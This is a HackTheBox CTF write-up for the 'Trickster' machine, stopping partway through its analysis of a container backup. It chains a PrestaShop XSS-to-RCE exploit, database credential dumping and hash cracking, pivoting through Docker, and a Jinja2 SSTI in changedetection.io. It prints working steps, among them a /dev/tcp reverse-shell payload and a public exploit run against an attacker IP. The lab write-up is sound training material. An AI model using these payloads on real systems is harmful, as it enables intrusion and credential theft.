---
title: "[EN] - HackTheBox: Trickster Write-Up"
date: 2024-11-21 11:07:00 +0700
categories: [HackTheBox, Boxes, Medium, Linux]
tags: [Prestashop, CVE-2024-34716, Jinja 2 SSTI, PrusaSlicer, CVE-2023-47268, Pivoting]
description: Trickster is a medium-difficulty Linux machine featuring a PrestaShop application vulnerable to CVE-2024-34716. Exploiting this vulnerability grants access to the remote server as the www-data user. Further enumeration reveals PrestaShop configuration files containing database credentials, allowing us to dump and crack password hashes to obtain the password for user james. We can then SSH into the server as james. A Docker container running ChangeDetection.io is also present, vulnerable to CVE-2024-32651, which can be exploited to gain a root shell inside the container. Inside the container, backup files from ChangeDetection.io reveal the password for user adam, which allows SSH access as adam. Finally, privilege escalation to root is achieved by exploiting CVE-2023-47268 in the PrusaSlicer tool.
image: /assets/img/HTB-Trickster_banner.png
---

## Enumeration
### Open TCP Ports
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ nmap -sVC -T4 -p- -oN nmap/TCP_all_services.nmap 10.129.81.235
# Nmap <REDACTED> scan initiated Thu Nov 21 16:36:15 2024 as: nmap -sVC -T4 -p- -oN nmap/TCP_all_services.nmap 10.129.81.235
Nmap scan report for 10.129.81.235
Host is up (0.018s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://trickster.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 21 16:36:23 2024 -- 1 IP address (1 host up) scanned in 7.65 seconds
```
  
The scan reveals two open ports : SSH on **port 22** and HTTP on **port 80**. 
The HTTP service redirects to ``http://trickster.htb/``, so the domain is added to ``/etc/hosts`` to proceed with web enumeration.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ cat /etc/hosts | grep trickster.htb
10.129.81.235 trickster.htb

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ ping -c 3 trickster.htb
PING trickster.htb (10.129.81.235) 56(84) bytes of data.
64 bytes from trickster.htb (10.129.81.235): icmp_seq=1 ttl=63 time=17.2 ms
64 bytes from trickster.htb (10.129.81.235): icmp_seq=2 ttl=63 time=12.8 ms
64 bytes from trickster.htb (10.129.81.235): icmp_seq=3 ttl=63 time=15.3 ms
--- trickster.htb ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 2025ms
rtt min/avg/max/mdev = 12.776/15.077/17.173/1.800 ms
```
### Web Enumeration

With the domain name resolved, enumeration begins with virtual host fuzzing.

#### Virtual Host Enumeration
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://trickster.htb -H 'Host: FUZZ.trickster.htb' -r -fs 278

<SNIP>

shop           [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 40ms]:: 
Progress: [114441/114441] :: Job [1/1] :: 250 req/sec :: Duration: [0:07:37] :: Errors: 0 ::
```
  
The fuzzing uncovers a ``shop`` vhost. Worth noting that ``shop.trickster.htb`` can also be discovered directly from the **index** page of the main website, as shown below.
  
![](/assets/img/HTB-Trickster_1.png)
  
``shop.trickster.htb`` is added to ``/etc/hosts`` alongside the main domain.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ cat /etc/hosts | grep shop.trickster.htb
10.129.81.235 trickster.htb shop.trickster.htb
```

#### Directory Listing

Directory enumeration on ``shop.trickster.htb`` reveals an exposed ``.git`` repository.

##### shop.trickster.htb
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://shop.trickster.htb/FUZZ -fs 283

<SNIP>

.git           [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 71ms]
.git/HEAD      [Status: 200, Size: 28, Words: 2, Lines: 2, Duration: 92ms]
.git/index     [Status: 200, Size: 252177, Words: 733, Lines: 978, Duration: 21ms]
.git/config    [Status: 200, Size: 112, Words: 11, Lines: 8, Duration: 130ms]
.git/logs/     [Status: 200, Size: 1137, Words: 77, Lines: 18, Duration: 157ms]
:: Progress: [4734/4734] :: Job [1/1] :: 327 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```
  
Before diving into the repository, let's take a quick look at both websites to get a better sense of the attack surface.

### Website Recon

#### trickster.htb
  
![](/assets/img/HTB-Trickster_2.png)
  
The main site offers nothing of interest beyond a shop button that redirects to the ``shop.trickster.htb`` vhost found during the earlier fuzzing.

#### shop.trickster.htb
  
![](/assets/img/HTB-Trickster_3.png)
  
The shop is far more promising, it exposes a richer set of features, which naturally broadens the attack surface. 
Before enumerating those features, the exposed ``.git`` directory is worth analyzing first.

Using ``git-dumper``, the entire repository is downloaded locally.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ git-dumper http://shop.trickster.htb/.git web_files/
[-] Testing http://shop.trickster.htb/.git/HEAD [200]
[-] Testing http://shop.trickster.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://shop.trickster.htb/.git/ [200]
[-] Fetching http://shop.trickster.htb/.git/logs/ [200]
[-] Fetching http://shop.trickster.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://shop.trickster.htb/.git/HEAD [200]

<SNIP>

[-] Fetching http://shop.trickster.htb/.git/objects/f7/b237017934590a8b4b7c85e1a933941cd982be [200]
[-] Fetching http://shop.trickster.htb/.git/objects/f7/e04e89ebb08e5c616dae12beae5b299e82dab4 [200]
[-] Running git checkout .
Updated 1699 paths from the index
```
  
Checking the output directory confirms the full dump.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ ll web_files/
total 216K
drwxr-xr-x 1 tatsuki tatsuki  284 25 nov.  14:12 .
drwxr-xr-x 1 tatsuki tatsuki  164 25 nov.  14:11 ..
drwxr-xr-x 1 tatsuki tatsuki  378 25 nov.  14:12 admin634ewutrx1jgitlooaj
-rw-r--r-- 1 tatsuki tatsuki 1,3K 25 nov.  14:12 autoload.php
-rw-r--r-- 1 tatsuki tatsuki 2,5K 25 nov.  14:12 error500.html
drwxr-xr-x 1 tatsuki tatsuki  128 25 nov.  14:12 .git
-rw-r--r-- 1 tatsuki tatsuki 1,2K 25 nov.  14:12 index.php
-rw-r--r-- 1 tatsuki tatsuki 1,3K 25 nov.  14:12 init.php
-rw-r--r-- 1 tatsuki tatsuki  522 25 nov.  14:12 Install_PrestaShop.html
-rw-r--r-- 1 tatsuki tatsuki 5,0K 25 nov.  14:12 INSTALL.txt
-rw-r--r-- 1 tatsuki tatsuki 180K 25 nov.  14:12 LICENSES
-rw-r--r-- 1 tatsuki tatsuki  863 25 nov.  14:12 Makefile
-rw-r--r-- 1 tatsuki tatsuki 1,6K 25 nov.  14:12 .php-cs-fixer.dist.php
```
  
Two things stand out immediately : the ``Install_PrestaShop.html`` file confirms the shop is powered by PrestaShop (a popular open-source e-commerce platform) and the directory named ``admin634ewutrx1jgitlooaj`` looks like an admin panel path. 
In PrestaShop, the admin dashboard is intentionally given an obfuscated name to make it harder for attackers to find.

Navigating to the admin dashboard confirms this.
  
![](/assets/img/HTB-Trickster_4.png)

The login page leaks the PrestaShop version in use (``8.1.5``). With that information, a quick search for known CVEs reveals a [blog post](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) by Ayoub Mokhtar detailing how he chained multiple vulnerabilities to achieve remote code execution on PrestaShop versions 8.1.0 through 8.1.5.

---

## Initial Access
### Exploiting CVE-2024-34716
  
Before starting the exploitation, it's worth understanding how the CVE actually works.
According to the author, the ``/contact-us`` feature is vulnerable to a stored XSS attack, which can be chained with the upload of a malicious PrestaShop theme to achieve remote code execution.
  
Here is an overview of the attack chain, more details can be found in the author's original [post](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) :
  
1. The attacker crafts a malicious PNG file embedding an HTML payload designed to execute JavaScript code.
2. The malicious PNG is sent as an attachment to customer support via the ``/contact-us`` form, which is accessible without authentication.
3. Once the message is submitted, the attacker waits for a customer service agent to open the attachment, triggering the XSS payload and establishing the initial foothold needed to obtain remote code execution.
4. Using the stolen session cookie of the customer service agent, the attacker uploads a malicious PrestaShop theme containing a PHP reverse shell, granting RCE.
  
The author also provides an [exploit script](https://github.com/aelmokhtar/CVE-2024-34716) that automates most of this process.After downloading it, the required arguments are inspected.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/CVE-2024-34716]
└──╼ [★]$ python exploit.py 
usage: exploit.py [-h] --url URL --email EMAIL --local-ip LOCAL_IP --admin-path ADMIN_PATH
exploit.py: error: the following arguments are required: --url, --email, --local-ip, --admin-path
```
  
All required arguments are available except for the target email address, which can be retrieved from the ``/contact-us`` page.
  
![](/assets/img/HTB-Trickster_5.png)
  
The exploit is launched, and the wait begins for someone to open the malicious attachment.

> The runner used to simulate the customer agent click is pretty random. 
> You'll have to be patient and not hesitate to reset the machine.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/CVE-2024-34716]
└──╼ [★]$ python exploit.py --url http://shop.trickster.htb --email 'admin@trickster.htb' --local-ip <ATTACKER_IP> --admin-path 'admin634ewutrx1jgitlooaj'
[X] Starting exploit with:
    Url: http://shop.trickster.htb
    Email: admin@trickster.htb
    Local IP: <ATTACKER_IP>
    Admin Path: admin634ewutrx1jgitlooaj
[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.
Serving at http.Server on port 5000
Ncat: Version <REDACTED> ( https://nmap.org/ncat )Ncat: Listening on [::]:12345
Ncat: Listening on 0.0.0.0:12345
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
Request: GET /ps_next_8_theme_malicious.zip HTTP/1.1
Response: 200 -
10.129.81.235 - - [23/Nov/2024 15:35:36] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -

Ncat: Connection from 10.129.81.235:53862.
Linux trickster 5.15.0-121-generic \#131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 14:35:54 up 7 min,  0 users,  load average: 0.14, 0.07, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash");'

www-data@trickster:/$ ^Z
[1]+  Stopped                 python exploit.py --url http://shop.trickster.htb --email admin@trickster.htb --local-ip <ATTACKER_IP> --admin-path admin634ewutrx1jgitlooaj

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/CVE-2024-34716]
└──╼ [★]$ stty raw -echo; fg;
www-data@trickster:/$
```

Once the admin opens the malicious PNG, the XSS fires and a reverse shell lands.

---

## Privilege Escalation
### www-data -> james
  
With a foothold on the target as ``www-data``, the next step is to escalate to a proper user account. 
Since it's common for web service accounts to have access to configuration or database files containing credentials, PrestaShop's configuration is the natural starting point.
  
```shell
www-data@trickster:/$ ll /var/www/
total 20
drwxr-xr-x  5 root     root     4096 Sep 13 12:24 ./
drwxr-xr-x 14 root     root     4096 Sep 13 12:24 ../
drwxr-xr-x  2 root     root     4096 Sep 13 12:24 html/
drwxr-xr-x 28 www-data www-data 4096 Sep 17 18:07 prestashop/
drwxr-xr-x  4 www-data www-data 4096 Sep 17 18:07 trickster/

www-data@trickster:/$ ll /var/www/prestashop/
total 836
drwxr-xr-x 28 www-data www-data   4096 Sep 17 18:07 ./
drwxr-xr-x  5 root     root       4096 Sep 13 12:24 ../
drwxr-xr-x  8 www-data www-data   4096 Sep 13 12:24 .git/
-rw-r--r--  1 www-data www-data   3261 May 25  2024 .htaccess
-rwxr-xr-x  1 www-data www-data   1538 Mar  7  2024 .php-cs-fixer.dist.php*
-rwxr-xr-x  1 www-data www-data   5054 Mar  7  2024 INSTALL.txt*
-rwxr-xr-x  1 www-data www-data    522 Mar  7  2024 Install_PrestaShop.html*
-rwxr-xr-x  1 www-data www-data 183862 Mar  8  2024 LICENSES*
-rwxr-xr-x  1 www-data www-data    863 Mar  7  2024 Makefile*
drwxr-xr-x  8 www-data www-data   4096 Sep 13 12:24 admin634ewutrx1jgitlooaj/
drwxr-xr-x  5 www-data www-data   4096 Sep 13 12:24 app/

<SNIP>
```
  
Rather than manually hunting through files, the official PrestaShop [documentation](https://devdocs.prestashop-project.org/8/development/configuration/configuring-prestashop/) identifies the key configuration files to look at. 
The ``/app/config/parameters.php`` file yields database credentials.
  
```shell
www-data@trickster:/$ cat /var/www/prestashop/app/config/parameters.php
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'presXXXXXXXo',
    'database_prefix' => 'ps_',
    
<SNIP>
```
  
Using those credentials to log into the local MariaDB instance, the ``ps_employee`` table is queried and returns two password hashes, one for ``admin@trickster.htb`` and one for ``james@trickster.htb``.
  
```shell
www-data@trickster:/$ mysql -u ps_user -ppresXXXXXXXo
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2680
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use prestashop;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
MariaDB [prestashop]> select email,passwd from ps_employee;
+---------------------+---------------------------------------------------------+
| email               | passwd                                                  |
+---------------------+---------------------------------------------------------+
| admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C |
| james@trickster.htb | $2a$04$rgBYXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXLyunCmm |
+---------------------+---------------------------------------------------------+
2 rows in set (0.000 sec)
```
  
Both hashes are thrown at hashcat but only the Blowfish hash belonging to ``james`` cracks successfully.
  
```shell
PS C:\Users\Tatsuki\Tools\hashcat> .\hashcat.exe -m 3200 -O .\hashes\hashes.txt .\wordlists\rockyou.txt --show
$2a$04$rgBYXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXLyunCmm:alwXXXXXXXXXXver
```
  
Switching to ``james`` and grabbing the user flag.
  
```shell
www-data@trickster:/$ su - james
Password:
james@trickster:~$ cat user.txt
dc86XXXXXXXXXXXXXXXXXXXXXXXXd80b
```

---

### James -> Adam
#### Network Interfaces Enum
  
After running the usual checks (sudo version, environment variables, running services, ...) one thing stands out : the machine has multiple network interfaces, one of which belongs to Docker.
  
```shell
james@trickster:~$ ip a s
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:a1:f0 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.81.235/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2738sec preferred_lft 2738sec
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:80:19:8b:2c brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
17: vethce728bf@if16: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 2a:b7:b5:b7:d9:1d brd ff:ff:ff:ff:ff:ff link-netnsid 0
```
  
A quick ping sweep over the Docker subnet confirms a second host at ``172.17.0.2`` (aside from ``172.17.0.1``, which is the Docker bridge interface on the host itself).
  
```shell
james@trickster:~$ for j in {0..255} ;do for i in {1..254} ;do (ping -c 1 172.17.$j.$i | grep "bytes from" &) ;done ;done
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.077 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.051 ms
```

#### Setup a pivot to access to 172.17.0.2
  
To enumerate ``172.17.0.2`` with our own tooling rather than relying on what's installed on the box, Ligolo-ng is used to pivot through the compromised host.
The agent binary is transferred to Trickster via SCP :
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ scp ligolo-ng/ligolo-agent james@trickster.htb:/tmp
james@trickster.htb's password: 
ligolo-agent                    100% 5224KB   5.3MB/s   00:00    
```
  
The Ligolo proxy is started on the attacking machine and the agent is launched on Trickster to connect back.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/ligolo-ng]
└──╼ [★]$ sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:4321
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
WARN[0000] TLS Certificate fingerprint for ligolo is: 94980FFAD865D811D304149A530F4E4726285C29F4FEB86BACD63D2A93A20BB3 
INFO[0000] Listening on 0.0.0.0:4321                    
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   
  Made in France ♥            by @Nicocha30!
  Version: <REDACTED>
ligolo-ng »
```
  
```shell
james@trickster:~$ cd /tmp/
james@trickster:/tmp$ ./ligolo-agent -connect <ATTACKER_IP>:4321 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="<ATTACKER_IP>:4321"
```
  
Back on the proxy, the newly joined session is selected, a tun interface is created and the route to ``172.17.0.0/16`` is added so traffic to the Docker subnet is tunneled transparently.
  
```shell
ligolo-ng » INFO[0150] Agent joined.            name=james@trickster remote="10.129.81.235:48530"
ligolo-ng » 
ligolo-ng » session 
? Specify a session : 1 - #1 - james@trickster - 10.129.81.235:48530
[Agent : james@trickster] »
```
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ sudo ip tuntap add user tatsuki mode tun ligolo

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ sudo ip link set ligolo up

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ ip a s | grep ligolo
4: ligolo: <NO-CARRIER,POINTOPOINT,MULTICAST,NOARP,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 500

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ sudo ip route add 172.17.0.0/16 dev ligolo
```
  
```shell
[Agent : james@trickster] » start
[Agent : james@trickster] » INFO[0544] Starting tunnel to james@trickster
```
  
With the tunnel active, the ``172.17.0.2`` host is now reachable from the attacking machine.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ ping -c 3 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=70.1 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=66.3 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=69.4 ms
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2052ms
rtt min/avg/max/mdev = 66.348/68.624/70.102/1.633 ms
```
  
#### Services Enumeration on 172.17.0.2
  
An Nmap scan against the container reveals a single open port (``5000``).
  
```shell
┌─[10.10.16.36]─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster]
└──╼ [★]$ nmap -p- -T4 172.17.0.2
Starting Nmap <REDACTED> ( https://nmap.org ) at 2024-11-25 16:19 CET
Nmap scan report for 172.17.0.2
Host is up (0.021s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
5000/tcp open  upnp
Nmap done: 1 IP address (1 host up) scanned in 301.48 seconds
```
  
Navigating to port ``5000`` in a browser shows a ``changedetection.io`` instance (an open-source tool for monitoring website changes) running version ``0.45.20``.
This version is vulnerable to ``CVE-2024-32651``, a Server-Side Template Injection in Jinja2.
  
![](/assets/img/HTB-Trickster_6.png)
  
  
#### Exploiting CVE-2024-32651 (changedetection)
  
While several exploit scripts exist for this CVE, it's straightforward enough to exploit manually. 
A new watch is created and the edit button is used to access its configuration :
  
![](/assets/img/HTB-Trickster_7.png)
  
The ``Notifications`` tab is where the Jinja2 injection point lives. 
To confirm the vulnerability, a netcat listener is set up on the host's Docker interface and a simple PoC payload is injected into the notification body.
  
```shell
james@trickster:~$ nc -lvnp 9001
Listening on 0.0.0.0 9001
```
  
The notifications tab is configured as shown below.
  
![](/assets/img/HTB-Trickster_8.png)
  
Clicking ``Send test notification`` triggers the payload and a connection is received on the listener, confirming remote code execution as root inside the container.
  
![](/assets/img/HTB-Trickster_9.png)
  
```shell
Listening on 0.0.0.0 9001
Connection received on 172.17.0.2 54528
GET / HTTP/1.1
Host: 172.17.0.1:9001
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 38
uid=0(root) gid=0(root) groups=0(root)
```
  
With code execution confirmed, the same steps are repeated using a Jinja2 reverse shell payload.

{% raw %}  
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/9002 0>&1"').read() }}
```
{% endraw %}
  
A new listener is set up to catch the shell.
  
```shell
james@trickster:~$ nc -lvnp 9002
Listening on 0.0.0.0 9002
```
  
The notification is sent again.
  
![](/assets/img/HTB-Trickster_10.png)
  
A reverse shell is received from ``172.17.0.2``, running as root inside the container.
  
```shell
Listening on 0.0.0.0 9002
Connection received on 172.17.0.2 33500
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@a4b9a36ae7ff:/app# python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
root@a4b9a36ae7ff:/app# ^Z
[1]+  Stopped                 nc -lvnp 9002
james@trickster:~$ stty raw -echo;fg
nc -lvnp 9002
<tty rows 25 columns 126; alias ll='ls -lah --color'
root@a4b9a36ae7ff:/app#
```
  
#### Docker container enumeration
  
The presence of the ``.dockerenv`` file at the filesystem root confirms we're inside a Docker container.
Checking the filesystem root reveal two non-standard directories (``app`` and ``datastore``).
  
```shell
root@a4b9a36ae7ff:/app# ll /
total 72K
drwxr-xr-x   1 root root 4.0K Sep 26 11:03 .
drwxr-xr-x   1 root root 4.0K Sep 26 11:03 ..
-rwxr-xr-x   1 root root    0 Sep 26 11:03 .dockerenv
drwxr-xr-x   1 root root 4.0K Sep 13 12:24 app
lrwxrwxrwx   1 root root    7 Apr  8  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Sep 13 12:24 boot
drwxr-xr-x   6 root root 4.0K Nov 25 15:48 datastore
drwxr-xr-x   5 root root  340 Nov 25 15:40 dev
drwxr-xr-x   1 root root 4.0K Sep 26 11:03 etc
drwxr-xr-x   2 root root 4.0K Sep 13 12:24 home
<SNIP>
```
  
The ``/app`` directory contains the source code of ``changedetection.io``.
  
```shell
root@a4b9a36ae7ff:/app# ll /app/
total 24K
drwxr-xr-x 1 root root 4.0K Sep 13 12:24 .
drwxr-xr-x 1 root root 4.0K Sep 26 11:03 ..
-rwxr-xr-x 1 root root  106 Apr 18  2024 changedetection.py
drwxr-xr-x 1 root root 4.0K Sep 16 15:32 changedetectionio
```
  
The more interesting one is ``datastore``.
  
```shell
root@a4b9a36ae7ff:/app# ll /datastore/
total 56K
drwxr-xr-x 6 root root 4.0K Nov 25 15:48 .
drwxr-xr-x 1 root root 4.0K Sep 26 11:03 ..
drwxr-xr-x 2 root root 4.0K Nov 25 15:37 00933b25-ff6f-428b-b1e7-7d9c90a28695
drwxr-xr-x 2 root root 4.0K Aug 31 08:56 Backups
drwxr-xr-x 2 root root 4.0K Sep 19 11:44 b86f1003-3ecb-4125-b090-27e15ca605b9
drwxr-xr-x 2 root root 4.0K Sep 19 11:44 bbdd78f6-db98-45eb-9e7b-681a0c60ea34
-rw-r--r-- 1 root root   64 Aug 30 20:21 secret.txt
-rw-r--r-- 1 root root  155 Aug 30 20:25 url-list-with-tags.txt
-rw-r--r-- 1 root root   73 Aug 30 20:25 url-list.txt
-rw-r--r-- 1 root root  17K Nov 25 15:48 url-watches.json
```
  
The ``Backups`` directory looks particularly promising.
  
```shell
root@a4b9a36ae7ff:/app# ll /datastore/Backups/
total 52K
drwxr-xr-x 2 root root 4.0K Aug 31 08:56 .
drwxr-xr-x 6 root root 4.0K Nov 25 15:48 ..
-rw-r--r-- 1 root root 6.1K Aug 31 08:53 changedetection-backup-20240830194841.zip
-rw-r--r-- 1 root root  33K Aug 30 20:25 changedetection-backup-20240830202524.zip
```
  
Neither ``zip`` nor ``unzip`` are available inside the container, so both archives are transferred to the Trickster host first, then pulled down to the attacking machine.
  
```shell
root@a4b9a36ae7ff:/app# unzip
bash: unzip: command not found
root@a4b9a36ae7ff:/app# zip
bash: zip: command not found
```
  
```shell
root@a4b9a36ae7ff:/app# cd /datastore/Backups/
root@a4b9a36ae7ff:/datastore/Backups# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
  
Now let's go the Trickster host (172.17.0.1) and download both zips from the container.
  
```shell
james@trickster:~$ cd /tmp/
james@trickster:/tmp$ mkdir backups && cd backups
james@trickster:/tmp/backups$ wget http://172.17.0.2:8000/changedetection-backup-20240830194841.zip
--2024-11-25 16:03:08--  http://172.17.0.2:8000/changedetection-backup-20240830194841.zip
Connecting to 172.17.0.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6221 (6.1K) [application/zip]
Saving to: ‘changedetection-backup-20240830194841.zip'
changedetection-backup-20240830 100%[=====================================================>]   6.08K  --.-KB/s    in 0s      
2024-11-25 16:03:08 (382 MB/s) - ‘changedetection-backup-20240830194841.zip' saved [6221/6221]

james@trickster:/tmp/backups$ wget http://172.17.0.2:8000/changedetection-backup-20240830202524.zip
--2024-11-25 16:03:17--  http://172.17.0.2:8000/changedetection-backup-20240830202524.zip
Connecting to 172.17.0.2:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33708 (33K) [application/zip]
Saving to: ‘changedetection-backup-20240830202524.zip'
changedetection-backup-20240830 100%[=====================================================>]  32.92K  --.-KB/s    in 0s      
2024-11-25 16:03:17 (199 MB/s) - ‘changedetection-backup-20240830202524.zip' saved [33708/33708]
```
  
From there we transfer both archives to our attacking hosts using the same process.
  
#### Container Backup Files Analysis
  
Extracting ``changedetection-backup-20240830194841.zip`` reveals an unusual file with a ``.txt.br`` extension.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/backup_zips]
└──╼ [★]$ unzip changedetection-backup-20240830194841.zip
Archive:  changedetection-backup-20240830194841.zip
   creating: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/f04f0732f120c0cc84a993ad99decb2c.txt.br  
 extracting: b4a8b52d-651b-44bc-bbc6-f9e8c6590103/history.txt  
  inflating: secret.txt              
  inflating: url-list.txt            
  inflating: url-list-with-tags.txt  
  inflating: url-watches.json
```
  
The ``.br`` extension corresponds to Brotli, a lossless compression algorithm developed by Google. To decompress the file we can use the ``brotli -d`` command.
  
```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/backup_zips]
└──╼ [★]$ cd b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Medium/Trickster/privEsc/backup_zips/b4a8b52d-651b-44bc-bbc6-f9e8c6590103]
└──╼ [★]$ brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br 

